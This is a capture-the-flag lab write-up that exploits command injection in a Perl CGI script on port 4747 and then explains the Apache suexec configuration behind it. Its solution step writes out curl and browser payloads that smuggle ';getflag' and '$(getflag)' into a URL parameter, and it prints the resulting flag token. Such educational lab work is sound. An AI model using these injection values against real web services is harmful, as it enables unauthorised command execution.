# Level04 : find flag04

## Tutorial

### 1. Checking `$HOME`, `ls -l ~/level04.pl`

   - result : `-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 /home/user/level04/level04.pl`
   - `.pl` is a perl file
   - `cat ~/level04.pl`, see file in folder :
     - shebang : `#!/usr/bin/perl`
     - hint : `# localhost:4747` 
     - CGI + `sub x` function + `x(param("x"))`

### 2. Connect to `curl http://<IP>:4747/level04.pl\?x\=toto`

   - result : `toto`
   - Conclusion : there is a server running on port `4747` and the file `~/level04.pl` is a hint

### 3. Solution

   - with curl : `curl http://192.168.56.3:4747/level04.pl\?x\=toto+%3B+"getflag"`, toto is not necessary, 3B=";" on ascii
   - in browser : `http://192.168.56.3:4747/level04.pl?x="toto+%3B+$(getflag)"`, toto is not necesary
   - result : `toto ; Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap`
   - DONE !

## Additionnal explanations

### 1. Check server file and configuration

- launch `netstat -pnltu | grep 4747` => `tcp6    0    0    :::4747    :::*    LISTEN    -`
- launch `ps -aux | grep apache2` => multiple lines user `root` and `www-data`
```
root      1409  0.0  0.6  21340  6264 ?        Ss   Apr09   0:04 /usr/sbin/apache2 -k start
www-data  1452  0.0  0.4  21420  4420 ?        S    Apr09   0:00 /usr/sbin/apache2 -k start
...
```

### 2. server files : `cd /var/www/level04`, `ls -l /var/www/level04`

- result : `-r-xr-x---+ 1 flag04 level04 152 Apr  9 15:59 level04.pl`
- note : the `+` is for the acl, use `getfacl /var/www/level04` for more information

### 3. server configuration files : `cd /etc/apache2/`

- result : `ls -l /etc/apache2/sites-enabled/` => `lrwxrwxrwx 1 root root 31 Aug 30  2015 level05.conf -> ../sites-available/level05.conf`
- see what is in conf file : `cat /etc/apache2/sites-enabled/level05.conf` => see below
```
<VirtualHost *:4747>
	DocumentRoot	/var/www/level04/
	SuexecUserGroup flag04 level04
	<Directory /var/www/level04>
		Options +ExecCGI
		DirectoryIndex level04.pl
		AllowOverride None
		Order allow,deny
		Allow from all
		AddHandler cgi-script .pl
	</Directory>
</VirtualHost>
```

### 4. Conclusion

- `SuexecUserGroup` is used to define the `user` and `group` launching the program
- we can see that the `DocumentRoot` is in `/var/www/level04/` with file name `level04.pl`
- We can see that the `user` is `flag04` which allows us to use `getflag` command
- getflag !

### 5. Notes

- the previous method which consist of creating `/tmp/echo` with correct permissions can't work here
- reason : `cat /etc/environment` set the `$PATH` variable for all users
- more explanation in `/level03/Resources/README.md`

## Additional resources

- apache server :
  - url : https://www.digitalocean.com/community/tutorials/how-to-configure-the-apache-web-server-on-an-ubuntu-or-debian-vps
- Module Apache mod_suexec : permet l'exécution des scripts CGI sous l'utilisateur et le groupe spécifiés
  - url : https://httpd.apache.org/docs/2.4/fr/mod/mod_suexec.html
  - Syntaxe : `SuexecUserGroup Utilisateur Groupe`
- Perl, setting locale :
  - url : https://www.thomas-krenn.com/en/wiki/Perl_warning_Setting_locale_failed_in_Debian
- Perl and CGI :
  - https://www.cs.ait.ac.th/~on/O/oreilly/perl/learn32/ch18_04.htm
  - http://devernay.free.fr/cours/internet/cgi/perlex.html
- Check services running on ports :
 - url : https://linoxide.com/linux-how-to/check-service-running-linux-port/
 - usage : `netstat -pnltu`
- ACL : Access Control List
  - url : https://lea-linux.org/documentations/ACL
- Find live hosts on my network :
  - url : https://security.stackexchange.com/questions/36198/how-to-find-live-hosts-on-my-network
